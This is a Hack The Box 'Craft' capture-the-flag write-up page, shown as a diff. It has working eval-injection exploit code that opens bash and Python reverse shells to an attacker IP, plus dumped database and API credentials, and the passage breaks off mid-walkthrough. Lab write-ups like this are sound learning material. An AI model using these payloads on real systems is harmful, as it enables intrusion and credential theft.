@@ -1,0 +1,236 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Recon After running nmap we get:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # Nmap 7."><title>Craft</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://hakbrain.xyz//icon.png><link href=https://hakbrain.xyz/styles.f40f9c8ac1c106641723dab5233fc67c.min.css rel=stylesheet><link href=https://hakbrain.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://hakbrain.xyz/js/darkmode.8bfc78cc60cc5da6df81ec79c82c3775.min.js></script>
+<script src=https://hakbrain.xyz/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://hakbrain.xyz/js/popover.abe6a51cc7138c5dff00f151dd627ad1.min.js></script>
+<script src=https://hakbrain.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://hakbrain.xyz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
+<script src=https://hakbrain.xyz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const BASE_URL="https://hakbrain.xyz/",fetchData=Promise.all([fetch("https://hakbrain.xyz/indices/linkIndex.e068852ac1d4c726f96843c25b8fe6a1.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://hakbrain.xyz/indices/contentIndex.a55941f836b3141bbde3293fea0e15e6.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://hakbrain.xyz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://hakbrain.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/hakbrain.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://hakbrain.xyz/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://hakbrain.xyz/>🕸️ H@kBr4in</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Craft</h1><p class=meta>Last updated
+Sep 6, 2022
+<a href=https://github.com/vlagh3/hakbrain/tree/hugo/content/write-ups/htb/craft.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://hakbrain.xyz/tags/writeups/>Writeups</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#recon>Recon</a><ol><li><a href=#changing-hosts-file>Changing hosts file</a></li><li><a href=#gogs-page>Gogs page</a></li><li><a href=#api-page>API page</a></li></ol></li><li><a href=#exploiting-eval>Exploiting eval</a></li><li><a href=#escaping-the-jail>Escaping the jail</a></li><li><a href=#getting-root>Getting root</a></li><li><a href=#see-also>See Also</a></li></ol></nav></details></aside><p><img src=https://i.imgur.com/DOJzRQ6.png width=auto alt></p><a href=#recon><h2 id=recon><span class=hanchor arialabel=Anchor># </span>Recon</h2></a><p>After running <code>nmap</code> we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.80 scan initiated Fri Nov 22 09:31:03 2019 as: nmap -sC -sV -oA mango 10.10.10.162</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.162
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.14s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed ports
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
+</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>403</span> Forbidden
+</span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Mango <span class=p>|</span> Search Base
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>staging-order.mango.htb/organizationName<span class=o>=</span>Mango Prv Ltd./stateOrProvinceName<span class=o>=</span>None/countryName<span class=o>=</span>IN
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2019-09-27T14:21:19
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2020-09-26T14:21:19
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table></div></div><a href=#changing-hosts-file><h3 id=changing-hosts-file><span class=hanchor arialabel=Anchor># </span>Changing hosts file</h3></a><p>By looking at the source code we can see gogs and api subdomains</p><p>So I just modified the /etc/hosts to the following in order to access them.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
+</span></span></code></pre></td></tr></table></div></div><a href=#gogs-page><h3 id=gogs-page><span class=hanchor arialabel=Anchor># </span>Gogs page</h3></a><p><img src=https://i.imgur.com/wDN37yi.png width=auto alt></p><p>By a simple Google search we find out that
+<a href=https://gogs.io/ rel=noopener>Gogs</a> is a somewhat widely used git service.</p><p>Exploring the Craft repo we quickly find that there was an issue and a &ldquo;fix&rdquo; was implemented:
+<img src=https://i.imgur.com/eAIzGds.png width=auto alt></p><p>By simply looking at the code we can easily identify where the vulnerability is. That is, passing user defined input directly into the eval function.</p><p>We can also see that an API is used in the test file, so let&rsquo;s take a look at it as well.</p><a href=#api-page><h3 id=api-page><span class=hanchor arialabel=Anchor># </span>API page</h3></a><p>We are presented with this once the page loads:
+<img src=https://i.imgur.com/4cdaJZf.png width=auto alt></p><p>So as you can see we can login ( therefore getting a token ), check the validity of the token and delete,update,create,get brews. However we can&rsquo;t interact with it since we don&rsquo;t have any credentials in order to get a token&mldr;</p><p>But wait, let&rsquo;s take a closer look at those 2 commits from before.</p><p><img src=https://i.imgur.com/LjZ4X8U.png width=auto alt></p><p>OH, there you go, credentials found in the source code. Very bad practice indeed :))</p><a href=#exploiting-eval><h2 id=exploiting-eval><span class=hanchor arialabel=Anchor># </span>Exploiting eval</h2></a><p>Now that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel&mldr; that&rsquo;s easy we just need to do this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>urllib3</span><span class=o>.</span><span class=n>disable_warnings</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;https://api.craft.htb/api/&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;auth/login&#34;</span><span class=p>,</span> <span class=n>auth</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;dinesh&#39;</span><span class=p>,</span> <span class=s1>&#39;4aUh0A8PbVJxgd&#39;</span><span class=p>),</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>token</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=s1>&#39;token&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;abv&#34;</span>       <span class=p>:</span> <span class=s2>&#34;__import__(&#39;os&#39;).system(&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.136/7070 0&gt;&amp;1&#39;)#&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;name&#34;</span>      <span class=p>:</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;brewer&#34;</span>    <span class=p>:</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;style&#34;</span>     <span class=p>:</span> <span class=s2>&#34;test&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;X-Craft-API-Token&#39;</span><span class=p>:</span> <span class=n>token</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;brew/&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>And start our listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nvlp <span class=m>7070</span>
+</span></span></code></pre></td></tr></table></div></div><p>Execute it and&mldr; Nothing. But it sohuld work right?</p><p>Well that&rsquo;s what I thought in the first place as well, but after a lot of thinking, poking and coffe I found out that I was pretty restricted, so I said fuck it. And build the payload from scratch with the things I knew would work.</p><p>Finally I&rsquo;ve ended up with this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>eval</span><span class=p>(</span><span class=nb>compile</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;for x in range(1):</span><span class=se>\n</span><span class=s2> import socket,subprocess, os</span><span class=se>\n</span><span class=s2> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><span class=se>\n</span><span class=s2> s.connect((&#34;10.10.15.200&#34;, 7070))</span><span class=se>\n</span><span class=s2> os.dup2(s.fileno(),0)</span><span class=se>\n</span><span class=s2> os.dup2(s.fileno(),1)</span><span class=se>\n</span><span class=s2> os.dup2(s.fileno(),2)</span><span class=se>\n</span><span class=s2> import pty</span><span class=se>\n</span><span class=s2> pty.spawn(&#34;/bin/sh&#34;)&#34;&#34;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=s2>&#34;single&#34;</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p>After running the same script again, but with this payload I&rsquo;ve got a shell. Hooray!!</p><a href=#escaping-the-jail><h2 id=escaping-the-jail><span class=hanchor arialabel=Anchor># </span>Escaping the jail</h2></a><p>I run <code>whoami</code> and I&rsquo;m root. Uhmmm&mldr;. That&rsquo;s pretty strange, but ok let&rsquo;s take the root.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat: /root/root.txt: No such file or directory
+</span></span></code></pre></td></tr></table></div></div><p>At this point I was confused, I thought that I gained access to a box that I wasn&rsquo;t supposed to, but that couldn&rsquo;t happen. Thus, I took a deeper look and found out that I was in a jail. However, I was having access to a file that I was previously interested in, but couldn&rsquo;t find it in the gogs page. That file being <em><code>settings.py</code></em></p><p>So I just saw it in the directory I was currently in and took a look at it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Flask settings</span>
+</span></span><span class=line><span class=cl><span class=n>FLASK_SERVER_NAME</span> <span class=o>=</span> <span class=s1>&#39;api.craft.htb&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>FLASK_DEBUG</span> <span class=o>=</span> <span class=kc>False</span>  <span class=c1># Do not use debug mode in production</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Flask-Restplus settings</span>
+</span></span><span class=line><span class=cl><span class=n>RESTPLUS_SWAGGER_UI_DOC_EXPANSION</span> <span class=o>=</span> <span class=s1>&#39;list&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>RESTPLUS_VALIDATE</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl><span class=n>RESTPLUS_MASK_SWAGGER</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl><span class=n>RESTPLUS_ERROR_404_HELP</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl><span class=n>CRAFT_API_SECRET</span> <span class=o>=</span> <span class=s1>&#39;hz66OCkDtv8G6D&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># database</span>
+</span></span><span class=line><span class=cl><span class=n>MYSQL_DATABASE_USER</span> <span class=o>=</span> <span class=s1>&#39;craft&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>MYSQL_DATABASE_PASSWORD</span> <span class=o>=</span> <span class=s1>&#39;qLGockJ6G2J75O&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>MYSQL_DATABASE_DB</span> <span class=o>=</span> <span class=s1>&#39;craft&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>MYSQL_DATABASE_HOST</span> <span class=o>=</span> <span class=s1>&#39;db&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span></code></pre></td></tr></table></div></div><p>Another credentials, ok&mldr; but what can we do with them? Well, he is using them to connect to the db so let&rsquo;s do the same:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pymysql</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>craft_api</span> <span class=kn>import</span> <span class=n>settings</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># test connection to mysql database</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>connection</span> <span class=o>=</span> <span class=n>pymysql</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;db&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                             <span class=n>user</span><span class=o>=</span><span class=s1>&#39;craft&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                             <span class=n>password</span><span class=o>=</span><span class=s1>&#39;qLGockJ6G2J75O&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                             <span class=n>db</span><span class=o>=</span><span class=s1>&#39;craft&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                             <span class=n>cursorclass</span><span class=o>=</span><span class=n>pymysql</span><span class=o>.</span><span class=n>cursors</span><span class=o>.</span><span class=n>DictCursor</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>connection</span><span class=o>.</span><span class=n>cursor</span><span class=p>()</span> <span class=k>as</span> <span class=n>cursor</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>sql</span> <span class=o>=</span> <span class=s2>&#34;select * from users&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>cursor</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=n>sql</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>cursor</span><span class=o>.</span><span class=n>fetchall</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>result</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>finally</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>connection</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>And we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}
+</span></span><span class=line><span class=cl>{&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}
+</span></span><span class=line><span class=cl>{&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}
+</span></span></code></pre></td></tr></table></div></div><p>Nice we&rsquo;ve now got the credentials for every user.
+Now what?</p><p>At this point I thought to SSH with the found credentials, but it didn&rsquo;t work. So after getting into some really deep rabbit holes I&rsquo;ve decided to try to connect to the Gogs page with the new secrets as a last hope.</p><p>And I&rsquo;ve got in with the <code>gilfoyle</code> user, prompted with this:
